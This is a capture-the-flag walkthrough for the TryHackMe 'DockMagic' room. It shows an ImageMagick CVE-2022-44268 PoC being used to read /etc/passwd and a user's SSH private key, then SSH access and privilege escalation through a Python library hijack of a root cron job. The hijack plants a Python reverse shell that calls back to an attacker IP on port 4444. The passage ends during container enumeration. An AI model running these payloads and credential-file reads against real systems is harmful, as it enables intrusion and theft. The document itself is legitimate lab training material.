<h1 align="center"><a href="https://tryhackme.com/room/dockmagic">DockMagic</a></h1>
<p align="center">ImageMagick Local File Inclusion (LFI) - CVE-2022-44268<br>Python Library Hijacking<br>Cgroup v1 release_agent Escape - CVE-2022-0492<br><img width="590px" src="https://github.com/user-attachments/assets/64d14763-8ff5-46fa-a0b0-7946c6cfc013"><br>
If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://githubhttps://github.com/user-attachments/assets/f9d56f26-bf87-4309-b5d8-f98cbb0302b0com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20MAR%2020-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p

<br>
<br>
<h2>Task 1 &nbsp;・&nbsp; Mystique</h2> 
<p>See if you can uncover the secrets hidden with the mystical things you create.<br>

Please allow the machine 3 - 5 minutes to fully boot.</p>

<p><em>Answer the questions below</em></p>

<br>


```bash
:~/DockMagic# nmap -sC -sV -Pn -n -p- -T4 --min-rate 1000 MachineIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e6:b7:14:81:2d:c6:43:bd:f7:8e:ee:b3:7e:32:d3:09 (RSA)
|   256 7d:64:9d:6c:8d:24:9d:53:b4:7a:ac:c8:f9:da:8b:74 (ECDSA)
|_  256 d1:30:1a:39:c6:46:9a:47:91:12:c6:4d:0d:b9:4e:26 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://site.empman.thm/
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

```bash
MachineIP site.empman.thm empman.thm
```

```bash
:~/DockMagic# https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt
```

```bash
:~/DockMagic# ffuf -u http://empman.thm/ -H "Host:FUZZ.empman.thm" -w /root/DockMagic/wordlist.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://empman.thm/
 :: Wordlist         : FUZZ: /root/DockMagic/wordlist.txt
 :: Header           : Host: FUZZ.empman.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

backup                  [Status: 200, Size: 255, Words: 56, Lines: 8, Duration: 118ms]
site                    [Status: 200, Size: 4611, Words: 839, Lines: 97, Duration: 177ms]
:: Progress: [5000/5000] :: Job [1/1] :: 8695 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

```bash
MachineIP backup.empman.thm site.empman.thm empman.thm
```

<br>
<br>
<br>

<img width="1023" height="676" alt="image" src="https://github.com/user-attachments/assets/6fb6ee6d-6d5f-4917-8687-8b1b7ac457e9" />

<br>
<br>
<br>

```bash
:~/DockMagic# exiftool -f default_profile-0e62db5feea53c333b2e336aa57dada4a199ba3a9f1dd5be609c383dc31e6c9a.png
ExifTool Version Number         : 12.76
File Name                       : default_profile-0e62db5feea53c333b2e336aa57dada4a199ba3a9f1dd5be609c383dc31e6c9a.png
Directory                       : .
File Size                       : 265 kB
File Modification Date/Time     : 2026:03:19 14:10:10+00:00
File Access Date/Time           : 2026:03:19 14:10:10+00:00
File Inode Change Date/Time     : 2026:03:19 14:10:10+00:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 555
Image Height                    : 600
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 72
Pixels Per Unit Y               : 72
Pixel Units                     : Unknown
Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
Comment                         : File source: http://wiki.teamfortress.com/wiki/File:Vigilant_Pin.png
Datecreate                      : 2012-09-04T17:49:31-07:00
Datemodify                      : 2012-09-04T17:49:31-07:00
Software                        : ImageMagick 6.5.7-8 2012-08-17 Q16 http://www.imagemagick.org
Thumb Document Pages            : 1
Thumb Imageheight               : 726
Thumb Image Width               : 672
Thumb Mimetype                  : image/png
Thumb M Time                    : 1346806171
Thumb Size                      : 311KiB
Thumb URI                       : file:///valve/var/www/wiki.teamfortress.com/w/images/2/2d/Vigilant_Pin.png
Image Size                      : 555x600
Megapixels                      : 0.333
```

<img width="1016" height="206" alt="image" src="https://github.com/user-attachments/assets/33f623d0-aadd-47a8-b438-f168b0b8173b" />

<br>
<br>

<img width="1020" height="722" alt="image" src="https://github.com/user-attachments/assets/dba05eaf-b0f6-40d3-9f89-5bb547874e4a" />

<br>
<br>
<br>

```bash
:~/DockMagic# git clone https://github.com/Sybil-Scan/imagemagick-lfi-poc
```

```bash
:~/DockMagic/imagemagick-lfi-poc# ls
README.md  generate.py
```

```bash
:~/DockMagic/imagemagick-lfi-poc# chmod +x generate.py
```

```bash
:~/DockMagic/imagemagick-lfi-poc# pip3 install pypng
```

```bash
:~/DockMagic/imagemagick-lfi-poc# python3 generate.py -f "/etc/passwd" -o exploit.png

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /etc/passwd
   [>] PoC PNG generated > exploit.png
```

```bash
:~/DockMagic/imagemagick-lfi-poc# file exploit.png
exploit.png: PNG image data, 255 x 255, 8-bit/color RGB, non-interlaced
```

<img width="1025" height="661" alt="image" src="https://github.com/user-attachments/assets/dfd1b008-3fdb-4505-9349-babadf23b6cb" />

<br>
<br>

<img width="1026" height="697" alt="image" src="https://github.com/user-attachments/assets/d381b81f-a4f2-48eb-b2b8-7bec33e330f3" />

<br>
<br>

<img width="1015" height="720" alt="image" src="https://github.com/user-attachments/assets/05212afc-6090-49b1-b137-7cdff2545d4d" />

<br>
<br>
<br>


```bash
:~/DockMagic/imagemagick-lfi-poc# wget http://site.empman.thm/rails/active_storage/disk/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdDVG9JYTJWNVNTSWhkbmx2ZVhKaWVEVjJabUV3TURnMmJtVnZPVE5rYTNoc1kyUjFNd1k2QmtWVU9oQmthWE53YjNOcGRHbHZia2tpUVdsdWJHbHVaVHNnWm1sc1pXNWhiV1U5SW1WNGNHeHZhWFF1Y0c1bklqc2dabWxzWlc1aGJXVXFQVlZVUmkwNEp5ZGxlSEJzYjJsMExuQnVad1k3QmxRNkVXTnZiblJsYm5SZmRIbHdaVWtpRG1sdFlXZGxMM0J1WndZN0JsUTZFWE5sY25acFkyVmZibUZ0WlRvS2JHOWpZV3c9IiwiZXhwIjoiMjAyNi0wMy0xOVQxNDoyODo1MC4yNzRaIiwicHVyIjoiYmxvYl9rZXkifX0=--c4237dcfff0b5d507a819853cfeaccbd6ce7b912/exploit.png
```

```bash
:~/DockMagic/imagemagick-lfi-poc# apt install imagemagick-6.q16
```

```bash
:~/DockMagic/imagemagick-lfi-poc# identify -verbose exploit.png.1
Image:
  Filename: exploit.png.1
  Permissions: rw-r--r--
  Format: PNG (Portable Network Graphics)
  Mime type: image/png
  Class: DirectClass
  Geometry: 150x150+0+0
  Units: Undefined
  Colorspace: sRGB
  Type: TrueColor
  Base type: Undefined
  Endianness: Undefined
  Depth: 8-bit
  Channel depth:
    red: 8-bit
    green: 8-bit
    blue: 8-bit
  Channel statistics:
    Pixels: 22500
    Red:
      min: 0  (0)
      max: 254 (0.996078)
      mean: 127 (0.498039)
      standard deviation: 73.6214 (0.288711)
      kurtosis: -1.19967
      skewness: -1.41868e-13
      entropy: 1
    Green:
      min: 0  (0)
      max: 254 (0.996078)
      mean: 43.0011 (0.168632)
      standard deviation: 60.4569 (0.237086)
      kurtosis: 0.717985
      skewness: 1.33219
      entropy: 0.617025
    Blue:
      min: 0  (0)
      max: 254 (0.996078)
      mean: 127 (0.498039)
      standard deviation: 73.6214 (0.288711)
      kurtosis: -1.19967
      skewness: -1.10726e-13
      entropy: 1
  Image statistics:
    Overall:
      min: 0  (0)
      max: 254 (0.996078)
      mean: 99.0004 (0.388237)
      standard deviation: 69.2332 (0.271503)
      kurtosis: -1.20673
      skewness: 0.298978
      entropy: 0.872342
  Rendering intent: Perceptual
  Gamma: 0.45455
  Chromaticity:
    red primary: (0.64,0.33,0.03)
    green primary: (0.3,0.6,0.1)
    blue primary: (0.15,0.06,0.79)
    white point: (0.3127,0.329,0.3583)
  Background color: white
  Border color: srgb(223,223,223)
  Matte color: grey74
  Transparent color: black
  Interlace: None
  Intensity: Undefined
  Compose: Over
  Page geometry: 150x150+0+0
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Orientation: Undefined
  Properties:
    date:create: 2026-03-19T14:28:31+00:00
    date:modify: 2026-03-19T14:23:49+00:00
    date:timestamp: 2026-03-19T14:30:45+00:00
    png:bKGD: chunk was found (see Background color, above)
    png:cHRM: chunk was found (see Chromaticity, above)
    png:gAMA: gamma=0.45455 (See Gamma, above)
    png:IHDR.bit-depth-orig: 8
    png:IHDR.bit_depth: 8
    png:IHDR.color-type-orig: 2
    png:IHDR.color_type: 2 (Truecolor)
    png:IHDR.interlace_method: 0 (Not interlaced)
    png:IHDR.width,height: 150, 150
    png:text: 4 tEXt/zTXt/iTXt chunks were found
    png:tIME: 2026-03-19T14:23:49Z
    Raw profile type: 

    1370
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
...
0a656d703a783a313030303a313030303a3a2f686f6d652f656d703a2f62696e2f626173
680a

    signature: 182bea3ffe4088b85ce2148d26116bd796d6b7b5c4d8bed44e13d78b57b09163
  Artifacts:
    filename: exploit.png.1
    verbose: true
  Tainted: False
  Filesize: 2006B
  Number pixels: 22500
  Pixels per second: 2.75549MB
  User time: 0.010u
  Elapsed time: 0:01.008
  Version: ImageMagick 6.9.12-98 Q16 x86_64 18038 https://legacy.imagemagick.org
```

<img width="1177" height="560" alt="image" src="https://github.com/user-attachments/assets/bca51fa8-8037-4873-827e-d9ffe084f4b9" />

<br>
<br>
<br>

```bash
:~/DockMagic/imagemagick-lfi-poc# python3 generate.py -f "/home/emp/.ssh/id_rsa" -o exploit.png

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /home/emp/.ssh/id_rsa
   [>] PoC PNG generated > exploit.png
```


```bash
:~/DockMagic/imagemagick-lfi-poc# wget http://site.empman.thm/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBGUT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--f48e92a9679ff57ebff543a0dc1e2fc2984764d0/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCem9MWm05eWJXRjBTU0lJY0c1bkJqb0dSVlE2QzNKbGMybDZaVWtpRFRFMU1IZ3hOVEFoQmpzR1ZBPT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--00594c5cc30698a1f94f93ea535a0b9cf2489a25/exploit.png
```   

```bash
:~/DockMagic/imagemagick-lfi-poc# identify -verbose exploit.png.1
Image:
  Filename: exploit.png.1
  Permissions: rw-r--r--
  Format: PNG (Portable Network Graphics)
  Mime type: image/png
  Class: DirectClass
  Geometry: 150x150+0+0
  Units: Undefined
  Colorspace: sRGB
  Type: TrueColor
  Base type: Undefined
  Endianness: Undefined
  Depth: 8-bit
  Channel depth:
    red: 8-bit
    green: 8-bit
    blue: 8-bit
  Channel statistics:
    Pixels: 22500
    Red:
      min: 0  (0)
      max: 254 (0.996078)
      mean: 127 (0.498039)
      standard deviation: 73.6214 (0.288711)
      kurtosis: -1.19967
      skewness: -1.41868e-13
      entropy: 1
    Green:
      min: 0  (0)
      max: 254 (0.996078)
      mean: 43.0011 (0.168632)
      standard deviation: 60.4569 (0.237086)
      kurtosis: 0.717985
      skewness: 1.33219
      entropy: 0.617025
    Blue:
      min: 0  (0)
      max: 254 (0.996078)
      mean: 127 (0.498039)
      standard deviation: 73.6214 (0.288711)
      kurtosis: -1.19967
      skewness: -1.10726e-13
      entropy: 1
  Image statistics:
    Overall:
      min: 0  (0)
      max: 254 (0.996078)
      mean: 99.0004 (0.388237)
      standard deviation: 69.2332 (0.271503)
      kurtosis: -1.20673
      skewness: 0.298978
      entropy: 0.872342
  Rendering intent: Perceptual
  Gamma: 0.45455
  Chromaticity:
    red primary: (0.64,0.33,0.03)
    green primary: (0.3,0.6,0.1)
    blue primary: (0.15,0.06,0.79)
    white point: (0.3127,0.329,0.3583)
  Background color: white
  Border color: srgb(223,223,223)
  Matte color: grey74
  Transparent color: black
  Interlace: None
  Intensity: Undefined
  Compose: Over
  Page geometry: 150x150+0+0
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Orientation: Undefined
  Properties:
    date:create: 2026-03-19T14:55:08+00:00
    date:modify: 2026-03-19T14:54:26+00:00
    date:timestamp: 2026-03-19T14:56:57+00:00
    png:bKGD: chunk was found (see Background color, above)
    png:cHRM: chunk was found (see Chromaticity, above)
    png:gAMA: gamma=0.45455 (See Gamma, above)
    png:IHDR.bit-depth-orig: 8
    png:IHDR.bit_depth: 8
    png:IHDR.color-type-orig: 2
    png:IHDR.color_type: 2 (Truecolor)
    png:IHDR.interlace_method: 0 (Not interlaced)
    png:IHDR.width,height: 150, 150
    png:text: 4 tEXt/zTXt/iTXt chunks were found
    png:tIME: 2026-03-19T14:54:26Z
    Raw profile type: 

    3381
2d2d2d2d2d424547494e204f50454e5353482050524956415445204b45592d2d2d2d2d0a
...

    signature: 182bea3ffe4088b85ce2148d26116bd796d6b7b5c4d8bed44e13d78b57b09163
  Artifacts:
    filename: exploit.png.1
    verbose: true
  Tainted: False
  Filesize: 4310B
  Number pixels: 22500
  Pixels per second: 3.91494MB
  User time: 0.000u
  Elapsed time: 0:01.005
  Version: ImageMagick 6.9.12-98 Q16 x86_64 18038 https://legacy.imagemagick.org
```   


```bash
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```   

<img width="845" height="528" alt="image" src="https://github.com/user-attachments/assets/6e0e3e21-127f-49ee-80be-c6b97b0120e5" />

<br>
<br>
<br>

```bash
:~/DockMagic/imagemagick-lfi-poc# chmod 600 id_rsa
```

```bash
root@ip-10-65-100-77:~/DockMagic/imagemagick-lfi-poc# ssh -i id_rsa emp@MachineIP
...
emp@23348446b037:~$
```

```bash
emp@23348446b037:~$ id
uid=1000(emp) gid=1000(emp) groups=1000(emp)
```

```bash
emp@23348446b037:~$ pwd
/home/emp
```

```bash
emp@23348446b037:~$ ls
app  flag1.txt  test.sh
```

```bash
emp@23348446b037:~$ cat flag1.txt
THM{•••••••••••••••••••••••••••••••••}
```

```bash
emp@23348446b037:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3   5784  3424 ?        Ss   14:48   0:00 /bin/bash ./cron_start.sh
root           9  0.0  0.4  13352  4368 ?        Ss   14:48   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          16  0.0  0.2   5632  2316 ?        Ss   14:48   0:00 /usr/sbin/cron
root          18  0.0  0.4   8796  4264 ?        S    14:48   0:00 su - emp -c cd /home/emp/app && export GEM_HOME=/home/emp/.gems && rm -f tmp/pids/server.pid && RAILS_ENV=production bundle
emp           19  0.6 10.8 1180436 105780 ?      Ssl  14:48   0:05 puma 5.6.5 (tcp://0.0.0.0:3000) [app]
root         270  0.0  0.9  14508  9068 ?        Ss   15:01   0:00 sshd: emp [priv]
emp          276  0.0  0.4  14508  4704 ?        R    15:01   0:00 sshd: emp@pts/0
emp          277  0.0  0.3   6048  3656 pts/0    Ss   15:01   0:00 -bash
emp          300  0.0  0.3   8644  3180 pts/0    R+   15:02   0:00 ps aux
```

```bash
:~/DockMagic# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

```bash
:~/DockMagic# chmod +x pspy64
```

```bash
:~/DockMagic# python3 -m http.server
```

```bash
emp@23348446b037:/tmp$ wget http://AttackIP:8000/pspy64
```

```bash
emp@23348446b037:/tmp$ ./pspy64
```

<img width="1309" height="753" alt="image" src="https://github.com/user-attachments/assets/c443cafc-2bbd-421b-9152-af812a89d9a4" />


```bash
...
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/03/19 15:08:55 CMD: UID=1000  PID=407    | ./pspy64 
2026/03/19 15:08:55 CMD: UID=1000  PID=277    | -bash 
2026/03/19 15:08:55 CMD: UID=1000  PID=276    | sshd: emp@pts/0   
2026/03/19 15:08:55 CMD: UID=0     PID=270    | sshd: emp [priv]  
2026/03/19 15:08:55 CMD: UID=1000  PID=19     | puma 5.6.5 (tcp://0.0.0.0:3000) [app]              
2026/03/19 15:08:55 CMD: UID=0     PID=18     | su - emp -c cd /home/emp/app && export GEM_HOME=/home/emp/.gems && rm -f tmp/pids/server.pid && RAILS_ENV=production bundle exec rails s -p 3000 -b '0.0.0.0' 
2026/03/19 15:08:55 CMD: UID=0     PID=16     | /usr/sbin/cron 
2026/03/19 15:08:55 CMD: UID=0     PID=9      | sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups 
2026/03/19 15:08:55 CMD: UID=0     PID=1      | /bin/bash ./cron_start.sh 
2026/03/19 15:09:01 CMD: UID=0     PID=416    | /usr/sbin/CRON 
2026/03/19 15:09:01 CMD: UID=0     PID=415    | /usr/sbin/CRON 
2026/03/19 15:09:01 CMD: UID=0     PID=417    | /usr/sbin/CRON 
2026/03/19 15:09:01 CMD: UID=0     PID=418    | /usr/sbin/CRON 
2026/03/19 15:09:01 CMD: UID=0     PID=419    | /bin/sh -c PYTHONPATH=/dev/shm:$PYTHONPATH python3 /usr/local/sbin/backup.py >> /var/log/cron.log 
2026/03/19 15:09:01 CMD: UID=0     PID=420    | /usr/sbin/CRON 
2026/03/19 15:09:01 CMD: UID=0     PID=421    | /usr/sbin/CRON 
2026/03/19 15:09:11 CMD: UID=0     PID=423    | /usr/sbin/exim4 -Mc 1w3Ezn-00006m-Bs 
2026/03/19 15:09:11 CMD: UID=105   PID=424    | 
2026/03/19 15:09:21 CMD: UID=0     PID=426    | /usr/sbin/exim4 -Mc 1w3Ezn-00006m-Bs 
2026/03/19 15:09:21 CMD: UID=0     PID=425    | /usr/sbin/exim4 -Mc 1w3Ezn-00006m-Bs 
2026/03/19 15:09:21 CMD: UID=0     PID=429    | /usr/sbin/exim4 -Mc 1w3Ezn-00006n-Cp 
2026/03/19 15:09:21 CMD: UID=105   PID=432    | 
2026/03/19 15:10:01 CMD: UID=0     PID=434    | /usr/sbin/CRON 
2026/03/19 15:10:01 CMD: UID=0     PID=433    | /usr/sbin/CRON 
2026/03/19 15:10:01 CMD: UID=0     PID=435    | /usr/sbin/CRON 
2026/03/19 15:10:01 CMD: UID=0     PID=436    | /usr/sbin/CRON 
2026/03/19 15:10:01 CMD: UID=0     PID=437    | /usr/sbin/CRON 
2026/03/19 15:10:01 CMD: UID=0     PID=438    | /bin/sh -c PYTHONPATH=/dev/shm:$PYTHONPATH python3 /usr/local/sbin/backup.py >> /var/log/cron.log 
2026/03/19 15:10:01 CMD: UID=0     PID=439    | /usr/sbin/CRON 
2026/03/19 15:10:11 CMD: UID=105   PID=440    | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root 
2026/03/19 15:10:11 CMD: UID=105   PID=441    | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root 
2026/03/19 15:10:16 CMD: UID=8     PID=442    | /usr/sbin/exim4 -Mc 1w3F0l-000072-Et 
2026/03/19 15:10:21 CMD: UID=8     PID=446    | /usr/sbin/exim4 -Mc 1w3F0l-000075-Fn 
2026/03/19 15:11:01 CMD: UID=0     PID=451    | /usr/sbin/CRON 
2026/03/19 15:11:01 CMD: UID=0     PID=450    | /usr/sbin/CRON 
2026/03/19 15:11:01 CMD: UID=0     PID=452    | /usr/sbin/CRON 
2026/03/19 15:11:01 CMD: UID=0     PID=453    | /bin/sh -c PYTHONPATH=/dev/shm:$PYTHONPATH python3 /usr/local/sbin/backup.py >> /var/log/cron.log 
2026/03/19 15:11:01 CMD: UID=0     PID=454    | /usr/sbin/CRON 
2026/03/19 15:11:01 CMD: UID=0     PID=455    | /usr/sbin/CRON 
2026/03/19 15:11:01 CMD: UID=0     PID=456    | /usr/sbin/CRON 
2026/03/19 15:11:11 CMD: UID=105   PID=457    | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root 
2026/03/19 15:11:11 CMD: UID=105   PID=458    | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root 
2026/03/19 15:11:21 CMD: UID=105   PID=460    | 
2026/03/19 15:11:21 CMD: UID=0     PID=459    | /usr/sbin/exim4 -Mc 1w3F1j-00007L-Ik 
2026/03/19 15:11:21 CMD: UID=0     PID=462    | /usr/sbin/exim4 -Mc 1w3F1j-00007L-Ik 
2026/03/19 15:11:21 CMD: UID=8     PID=463    | /usr/sbin/exim4 -Mc 1w3F1j-00007M-J3 
2026/03/19 15:12:01 CMD: UID=0     PID=468    | /usr/sbin/CRON 
2026/03/19 15:12:01 CMD: UID=0     PID=467    | /usr/sbin/CRON 
2026/03/19 15:12:01 CMD: UID=0     PID=469    | /usr/sbin/CRON 
2026/03/19 15:12:01 CMD: UID=0     PID=470    | /usr/sbin/CRON 
2026/03/19 15:12:01 CMD: UID=0     PID=471    | /usr/sbin/CRON 
2026/03/19 15:12:01 CMD: UID=0     PID=472    | /bin/sh -c PYTHONPATH=/dev/shm:$PYTHONPATH python3 /usr/local/sbin/backup.py >> /var/log/cron.log 
2026/03/19 15:12:01 CMD: UID=0     PID=473    | /usr/sbin/CRON 
2026/03/19 15:12:11 CMD: UID=0     PID=475    | /usr/sbin/exim4 -Mc 1w3F2h-00007a-L8 
2026/03/19 15:12:11 CMD: UID=105   PID=474    | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root 
2026/03/19 15:12:21 CMD: UID=8     PID=476    | /usr/sbin/exim4 -Mc 1w3F2h-00007a-L8 
2026/03/19 15:12:21 CMD: UID=105   PID=481    | 
2026/03/19 15:12:21 CMD: UID=0     PID=480    | /usr/sbin/exim4 -Mc 1w3F2h-00007d-LM 
2026/03/19 15:12:21 CMD: UID=0     PID=479    | /usr/sbin/exim4 -Mc 1w3F2h-00007d-LM 
2026/03/19 15:13:01 CMD: UID=0     PID=485    | /usr/sbin/CRON 
2026/03/19 15:13:01 CMD: UID=0     PID=484    | /usr/sbin/CRON 
2026/03/19 15:13:01 CMD: UID=0     PID=486    | /usr/sbin/CRON 
2026/03/19 15:13:01 CMD: UID=0     PID=487    | /usr/sbin/CRON 
2026/03/19 15:13:01 CMD: UID=0     PID=488    | /usr/sbin/CRON 
2026/03/19 15:13:01 CMD: UID=0     PID=489    | /bin/sh -c PYTHONPATH=/dev/shm:$PYTHONPATH python3 /usr/local/sbin/backup.py >> /var/log/cron.log 
2026/03/19 15:13:01 CMD: UID=0     PID=490    | /usr/sbin/CRON 
2026/03/19 15:13:11 CMD: UID=105   PID=491    | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root 
2026/03/19 15:13:11 CMD: UID=0     PID=492    | /usr/sbin/exim4 -Mc 1w3F3f-00007u-Pa 
2026/03/19 15:13:16 CMD: UID=8     PID=493    | /usr/sbin/exim4 -Mc 1w3F3f-00007r-Oi 
2026/03/19 15:13:21 CMD: UID=8     PID=497    | /usr/sbin/exim4 -Mc 1w3F3f-00007u-Pa 
2026/03/19 15:14:01 CMD: UID=0     PID=502    | /usr/sbin/CRON 
2026/03/19 15:14:01 CMD: UID=0     PID=501    | /usr/sbin/CRON 
2026/03/19 15:14:01 CMD: UID=0     PID=503    | /usr/sbin/CRON 
2026/03/19 15:14:01 CMD: UID=0     PID=504    | /usr/sbin/CRON 
2026/03/19 15:14:01 CMD: UID=0     PID=505    | /bin/sh -c PYTHONPATH=/dev/shm:$PYTHONPATH python3 /usr/local/sbin/backup.py >> /var/log/cron.log 
2026/03/19 15:14:01 CMD: UID=0     PID=506    | /usr/sbin/CRON 
2026/03/19 15:14:01 CMD: UID=0     PID=507    | /usr/sbin/CRON 
2026/03/19 15:14:11 CMD: UID=105   PID=509    | 
2026/03/19 15:14:11 CMD: UID=105   PID=508    | 
2026/03/19 15:14:21 CMD: UID=0     PID=511    | /usr/sbin/exim4 -Mc 1w3F4d-00008B-S2 
2026/03/19 15:14:21 CMD: UID=0     PID=510    | /usr/sbin/exim4 -Mc 1w3F4d-00008A-S2 
2026/03/19 15:14:21 CMD
```

```bash
emp@23348446b037:/usr/local/sbin$ cat backup.py
#custom backup script (to be created)
import cbackup
import time

# Start backup process
cbackup.init('/home/emp/app')
# log completion time
t=time.localtime()
current_time = time.strftime("%H:%M:%s", t)
print(current_time)
```

```bash
:~/DockMagic# cat cbackup.py
import socket,os,pty;

s=socket.socket()
s.connect(("10.65.100.77",4444));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
pty.spawn("/bin/sh")
```

```bash
emp@23348446b037:/dev/shm$ wget http://10.65.100.77:8000/cbackup.py
```

```bash
:~/DockMagic# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on MachineIP 35720
# id
id
uid=0(root) gid=0(root) groups=0(root)
# which python3
which python3
/usr/bin/python3
# python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@23348446b037:~# export TERM=xterm
export TERM=xterm
root@23348446b037:~# ^Z
[1]+  Stopped                 nc -nlvp 4444
:~/DockMagic# stty raw -echo; fg
nc -nlvp 4444
```

```bash
root@23348446b037:~# pwd
/root
root@23348446b037:~# ls
flag2.txt
root@23348446b037:~# cat flag2.txt
THM{••••••••••••••••••••••••••••••••}
```

```bash
:~/DockMagic#  wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
```

```bash
:~/DockMagic# ls
cbackup.py  deepce.sh  imagemagick-lfi-poc  pspy64
```

```bash
root@23348446b037:/tmp# wget http://10.65.100.77:8000/deepce.sh
```

```
root@23348446b037:/tmp# chmod +x deepce.sh
```

<img width="1189" height="781" alt="image" src="https://github.com/user-attachments/assets/2b5f668b-9f73-49d7-a1db-c1c449cdec72" />

<img width="1317" height="770" alt="image" src="https://github.com/user-attachments/assets/cf56283b-7cb4-4568-85eb-5c7af37d533b" />

<img width="1308" height="776" alt="image" src="https://github.com/user-attachments/assets/da866db5-ac16-4ed1-a11d-fb0f889f9853" />

```
root@23348446b037:/tmp# ./deepce.sh

                      ##         .
                ## ## ##        ==
             ## ## ## ##       ===
         /"""""""""""""""""\___/ ===
    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~
         \______ X           __/
           \    \         __/
            \____\_______/
          __
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter

==========================================( Colors )==========================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check
[+] Negative Test ........... No
[+] Multi line test ......... Yes
Command output
spanning multiple lines

Tips will look like this and often contains links with additional info. You can usually 
ctrl+click links in modern terminal to open in a browser window
See https://stealthcopter.github.io/deepce

===================================( Enumerating Platform )===================================
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... Yes
/usr/bin/docker
[+] User .................... root
[+] Groups .................. root
[+] Sudoers ................. Yes
root	ALL=(ALL:ALL) ALL
%sudo	ALL=(ALL:ALL) ALL
[+] Docker Executable ....... /usr/bin/docker
[+] Docker version .......... 24.0.5
[+] Rootless ................ No
[+] User in Docker group .... No
[+] Docker Sock ............. Not Found
